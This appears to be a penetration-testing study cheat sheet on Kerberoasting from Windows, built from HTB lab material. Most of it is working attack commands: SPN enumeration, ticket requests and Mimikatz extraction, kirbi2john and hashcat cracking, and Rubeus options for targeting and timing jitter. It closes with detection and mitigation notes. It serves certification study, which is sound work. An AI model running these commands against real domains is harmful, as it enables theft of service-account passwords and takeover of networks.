# Kerberoasting — from Windows | CPTS Cheat Sheet

## 0. Core Idea

**Goal:** Abuse a user account with a **Service Principal Name (SPN)** to request a Kerberos **TGS**, extract the ticket, and crack it **offline** to recover the service account password.

### Mental model

```text
Domain user context
        |
        v
Find user accounts with SPNs
        |
        v
Request TGS for target SPN
        |
        v
TGS loaded in logon session / memory
        |
        v
Extract .kirbi ticket
        |
        v
Convert ticket -> Hashcat format
        |
        v
Hashcat -m 13100
        |
        v
Recovered password
        |
        v
Test privileges / reuse credentials / access service
```

> A TGS by itself does **not** mean you can execute as the service account. The value is that the TGS is encrypted using material derived from the service account's password, allowing offline password cracking.

---

## 1. What to Look For

### SPN

An **SPN** maps a service instance to the account running that service.

Examples from the HTB lab:

```text
backupjob/veam001.inlanefreight.local
sts/inlanefreight.local
MSSQLSvc/SPSJDB.inlanefreight.local:1433
MSSQLSvc/SQL-CL01-01inlanefreight.local:49351
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
adfsconnect/azure01.inlanefreight.local
```

### Prioritize

Focus on **user/service accounts**, not normal computer-account SPNs.

Useful clues:

```text
Service account
Privileged group membership
adminCount = 1
Old password last-set date
RC4 support
Interesting services (MSSQLSvc, backup software, ADFS, etc.)
```

---

# 2. Semi-Manual Method

## Step 1 — Enumerate SPNs with setspn.exe

**Run on:** Windows domain-joined host in an authenticated domain-user context.

```cmd
setspn.exe -Q */*
```

### What it does

Queries the domain for SPNs.

Example:

```text
CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
```

### Important

```text
setspn -Q */*
        |
        +-- broad SPN search
```

Do not blindly treat every returned SPN as a roast target. First identify whether the SPN belongs to a **user account**.

Source: the HTB material explicitly says to focus on user accounts and ignore computer accounts for this step. fileciteturn2file0L27-L43

---

## Step 2 — Request a TGS for one SPN

**Run in:** PowerShell on the Windows host.

```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

### What is happening?

```text
Add-Type
  -> loads the .NET System.IdentityModel assembly

New-Object
  -> creates a .NET object

KerberosRequestorSecurityToken
  -> asks Kerberos for a service ticket for the supplied SPN
```

The resulting object shows information such as:

```text
ServicePrincipalName : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
SecurityKey          : InMemorySymmetricSecurityKey
```

The important part is that the TGS is now available in the current logon session. fileciteturn2file0L53-L73

---

## Step 3 — Request tickets for many SPNs

The HTB example combines `setspn.exe` with PowerShell:

```powershell
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

### Caution

This broad approach also requests tickets for computer accounts and other SPNs, so it is **less selective** than targeting known user/service accounts. fileciteturn2file0L75-L109

---

# 3. Extract the TGS with Mimikatz

**Run on:** same Windows host, from a context able to inspect the relevant Kerberos tickets.

```text
mimikatz
```

Inside Mimikatz:

```text
base64 /out:true
kerberos::list /export
```

### Useful output

You want to identify entries such as:

```text
0x00000017 - rc4_hmac_nt
Server Name : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433 @ INLANEFREIGHT.LOCAL
Client Name : htb-student @ INLANEFREIGHT.LOCAL
```

and the exported `.kirbi` ticket.

The HTB example shows `kerberos::list /export` exporting a ticket and returning its Base64 representation. fileciteturn2file0L119-L171

---

# 4. Easier Path: Export the .kirbi Directly

You do **not** have to use Base64 output.

```text
mimikatz # kerberos::list /export
```

This writes the `.kirbi` ticket(s) to disk.

Then move the `.kirbi` file to your Linux attack host for offline processing.

The HTB material explicitly notes that this skips the Base64 decode step. fileciteturn2file0L273-L275

---

# 5. Base64 Route -> .kirbi -> Hashcat

Use this route when Mimikatz gives you a Base64 ticket instead of a directly usable `.kirbi` file.

## Step 1 — Remove line breaks

**Run on:** Linux attack host.

```bash
echo "<base64 blob>" | tr -d '\n'
```

Save the resulting single-line Base64 string to a file.

---

## Step 2 — Decode back to .kirbi

```bash
cat encoded_file | base64 -d > sqldev.kirbi
```

Now you have:

```text
sqldev.kirbi
```

Source workflow: fileciteturn2file0L180-L199

---

## Step 3 — Convert .kirbi with kirbi2john.py

```bash
python2.7 kirbi2john.py sqldev.kirbi
```

This produces:

```text
crack_file
```

Source: fileciteturn2file0L204-L215

---

## Step 4 — Prepare for Hashcat

The HTB example converts the generated format with:

```bash
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

Check the result:

```bash
cat sqldev_tgs_hashcat
```

You should see a Kerberos TGS hash beginning with something similar to:

```text
$krb5tgs$23$*
```

Source workflow: fileciteturn2file0L217-L234

---

# 6. Crack with Hashcat

## RC4 / etype 23

Hashcat mode:

```text
13100
```

Command:

```bash
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```

### Meaning

```text
-m 13100   = Kerberos 5, etype 23, TGS-REP
```

If successful, Hashcat returns:

```text
<hash>:<password>
```

The HTB lab example recovered the password `database!`. fileciteturn2file0L239-L268

---

# 7. Automated Route — PowerView

PowerView can enumerate user accounts with SPNs and retrieve the TGS directly in Hashcat format.

## Import PowerView

**Run on:** Windows PowerShell.

```powershell
Import-Module .\PowerView.ps1
```

---

## Enumerate SPN Users

```powershell
Get-DomainUser * -spn | select samaccountname
```

Example users from the HTB lab:

```text
adfs
backupagent
krbtgt
sqldev
sqlprod
sqlqa
solarwindsmonitor
```

Source: fileciteturn2file0L281-L298

> `krbtgt` may appear in SPN enumeration output, but this does not make it an ordinary Kerberoasting target. Pay attention to what the tool/filter is actually selecting.

---

## Target One Account

```powershell
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

This returns a `Hash` field already formatted for Hashcat.

Source: fileciteturn2file0L303-L340

---

## Export All Tickets to CSV

```powershell
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

View it:

```powershell
cat .\ilfreight_tgs.csv
```

Source: fileciteturn2file0L345-L365

---

# 8. Automated Route — Rubeus

Rubeus is the fast, flexible Windows option in this module.

Basic help:

```powershell
.\Rubeus.exe
```

Basic Kerberoasting:

```powershell
.\Rubeus.exe kerberoast
```

Target one account:

```powershell
.\Rubeus.exe kerberoast /user:sqldev /nowrap
```

Target one specific SPN:

```powershell
.\Rubeus.exe kerberoast /spn:"MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433" /nowrap
```

Write hashes to a file:

```powershell
.\Rubeus.exe kerberoast /outfile:hashes.txt /nowrap
```

Source command families: fileciteturn2file0L370-L395

---

# 9. Rubeus Targeting / Filtering

## Use alternate credentials

```powershell
.\Rubeus.exe kerberoast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD /nowrap
```

## Use an existing TGT

```powershell
.\Rubeus.exe kerberoast /ticket:FILE.KIRBI /nowrap
```

## Use tgtdeleg

```powershell
.\Rubeus.exe kerberoast /usetgtdeleg /nowrap
```

## RC4-oriented / opsec mode from the HTB material

```powershell
.\Rubeus.exe kerberoast /rc4opsec /nowrap
```

## Get statistics without requesting tickets

```powershell
.\Rubeus.exe kerberoast /stats
```

## Target `adminCount=1`

```powershell
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

## Limit by password-set date

```powershell
.\Rubeus.exe kerberoast /pwdsetafter:01-31-2005 /pwdsetbefore:03-29-2010 /resultlimit:5 /nowrap
```

## Add delay / jitter

```powershell
.\Rubeus.exe kerberoast /delay:5000 /jitter:30 /nowrap
```

## AES Kerberoasting

```powershell
.\Rubeus.exe kerberoast /aes /nowrap
```

These options are directly from the Rubeus capability list in the supplied HTB material. fileciteturn2file0L380-L422

---

# 10. Rubeus `/stats` — What to Read

```powershell
.\Rubeus.exe kerberoast /stats
```

The lab output summarizes:

```text
Total kerberoastable users
Supported encryption types
Password last-set year
```

Example:

```text
Total kerberoastable users : 9

RC4_HMAC_DEFAULT                                 7
AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96 2
```

### Why `/stats` matters

It lets you understand the target set **without sending ticket requests** and helps you decide which accounts deserve attention first. The HTB material also highlights old password-set dates as potentially interesting because passwords may have remained unchanged for a long time. fileciteturn2file0L441-L479

---

# 11. `adminCount=1` Targeting

Useful command:

```powershell
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

### Why it matters

`adminCount=1` can identify accounts associated with protected / privileged groups and therefore can reduce a large Kerberoast target list to higher-value accounts.

Example from the lab:

```text
SamAccountName         : backupagent
ServicePrincipalName   : backupjob/veam001.inlanefreight.local
Supported ETypes       : RC4_HMAC_DEFAULT
```

The source uses `/nowrap` so the returned hash stays on one line and is easier to copy into offline cracking workflows. fileciteturn2file0L484-L518

---

# 12. `/nowrap` — Remember This

```powershell
.\Rubeus.exe kerberoast /nowrap
```

### Why?

Without it, output may be wrapped across lines.

With it:

```text
$krb5tgs$...<one continuous line>...
```

That makes copying the hash to your Linux cracking host much easier.

---

# 13. Encryption Types

## RC4 — etype 23

Typical Hashcat format starts with:

```text
$krb5tgs$23$
```

The HTB material describes RC4 as significantly easier/faster to crack offline than AES-based tickets.

## AES-128 — etype 17

```text
$krb5tgs$17$
```

## AES-256 — etype 18

```text
$krb5tgs$18$
```

The source notes that AES tickets can still be cracked when the underlying password is weak, but are typically much slower to crack than RC4. fileciteturn2file0L525-L529

### Quick recognition

| Prefix | EType | Practical note |
|---|---:|---|
| `$krb5tgs$23$` | 23 | RC4; generally faster to crack |
| `$krb5tgs$17$` | 17 | AES-128; slower |
| `$krb5tgs$18$` | 18 | AES-256; slower |

---

# 14. Important Server-Version Note from the HTB Material

The module explains a downgrade scenario involving `tgtdeleg` and RC4.

The supplied material states that this behavior differs on **Windows Server 2019** DCs: enabling AES on the SPN account results in an AES-256 ticket rather than the older downgrade behavior described for earlier DC versions.

So during an engagement, do not assume:

```text
AES account -> always possible to force RC4
```

Check the actual DC/server behavior and the ticket type returned.

The HTB source explicitly ties this observation to its Windows Server 2019 lab environment. fileciteturn2file0L525-L529

---

# 15. Kerberoasting Workflow — Fast Version

### Windows host

```powershell
# 1. See SPNs
setspn.exe -Q */*

# 2. Fast enumeration / targeting with Rubeus
.\Rubeus.exe kerberoast /stats

# 3. Focus on a user / privileged target
.\Rubeus.exe kerberoast /user:sqldev /nowrap

# or
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

### Linux cracking host

```bash
# If you already have a Hashcat-formatted TGS:
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```

### Manual fallback

```text
setspn
  -> PowerShell KerberosRequestorSecurityToken
  -> Mimikatz kerberos::list /export
  -> .kirbi
  -> kirbi2john.py
  -> Hashcat format
  -> hashcat -m 13100
```

---

# 16. What a Successful Crack Gives You

A cracked Kerberoast ticket gives you the **service account password**.

Then immediately determine what that account can do.

```text
Recovered password
        |
        +--> SMB authentication
        +--> WinRM
        +--> RDP
        +--> MSSQL / service-specific access
        +--> Local admin on other hosts
        +--> Privileged AD group membership
        +--> Further credential / privilege escalation paths
```

The HTB material gives examples including RDP, WinRM, PsExec-style remote administration, sensitive file shares, and MSSQL access. fileciteturn3file8

---

# 17. If Cracking Fails

Do **not** conclude that Kerberoasting was useless.

Check:

```text
Was the SPN actually on a user account?
Was the correct TGS extracted?
What encryption type is it?
Did Hashcat parse the format correctly?
Is the password simply too strong for the current wordlist?
Is the account actually privileged / interesting?
Are there other SPN users worth targeting?
```

Kerberoasting is an attack path, not a guaranteed credential-recovery technique.

---

# 18. Detection & Mitigation

## Mitigation

Prefer:

```text
Long, complex service-account passwords
Managed Service Accounts (MSA)
Group Managed Service Accounts (gMSA)
Other managed credential mechanisms where appropriate
```

Also consider reducing unnecessary use of RC4, while testing for operational compatibility.

Highly privileged accounts should not normally be used as SPN service accounts.

## Detection

The supplied HTB material highlights Kerberos service-ticket activity as a useful detection point.

Relevant Windows events:

```text
4769 = Kerberos service ticket requested
4770 = Kerberos service ticket renewed
```

A burst of many `4769` requests from one account in a short time can be anomalous and may indicate automated Kerberoasting, although normal baselines vary by environment.

The module notes that roughly 10–20 requests for a given account may be normal in some environments, so detection should be based on the organization's baseline rather than a universal fixed threshold. fileciteturn3file8

---

# 19. CPTS Memory Points

```text
SPN = maps a service to an account

Kerberoast target = user/service account with an SPN

Need = authenticated domain-user context (for this Windows route)

TGS = service ticket requested from Kerberos

TGS is not plaintext credentials

TGS -> extract -> crack offline

RC4 = etype 23
AES128 = etype 17
AES256 = etype 18

Hashcat RC4 TGS mode = 13100

Rubeus /nowrap = keep hash on one line

Rubeus /stats = enumerate statistics without requesting tickets

Rubeus /ldapfilter:'admincount=1' = focus on adminCount=1 accounts

After crack = test the recovered account everywhere relevant
```

---

# 20. Command Card

## Enumeration

```cmd
setspn.exe -Q */*
```

## Manual TGS request

```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "SPN"
```

## Mimikatz extraction

```text
base64 /out:true
kerberos::list /export
```

## Base64 -> `.kirbi`

```bash
echo "<base64>" | tr -d '\n'
cat encoded_file | base64 -d > ticket.kirbi
```

## `.kirbi` -> crack material

```bash
python2.7 kirbi2john.py ticket.kirbi
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > ticket_tgs_hashcat
```

## Crack RC4 TGS

```bash
hashcat -m 13100 ticket_tgs_hashcat /usr/share/wordlists/rockyou.txt
```

## PowerView

```powershell
Import-Module .\PowerView.ps1
Get-DomainUser * -spn | select samaccountname
Get-DomainUser -Identity USER | Get-DomainSPNTicket -Format Hashcat
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\tgs.csv -NoTypeInformation
```

## Rubeus

```powershell
.\Rubeus.exe kerberoast /stats
.\Rubeus.exe kerberoast /user:USER /nowrap
.\Rubeus.exe kerberoast /outfile:hashes.txt /nowrap
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
.\Rubeus.exe kerberoast /aes /nowrap
```

---

# 21. One-Line Mental Trigger

```text
SPN user -> request TGS -> extract ticket -> identify etype -> convert/format -> crack offline -> test recovered account -> enumerate privileges
```

---

## Source Scope

This cheat sheet is distilled from the supplied HTB **Kerberoasting - from Windows** material. It preserves the source's Windows-focused workflows, terminology, command examples, encryption discussion, and detection/mitigation points rather than replacing them with unrelated external procedures.
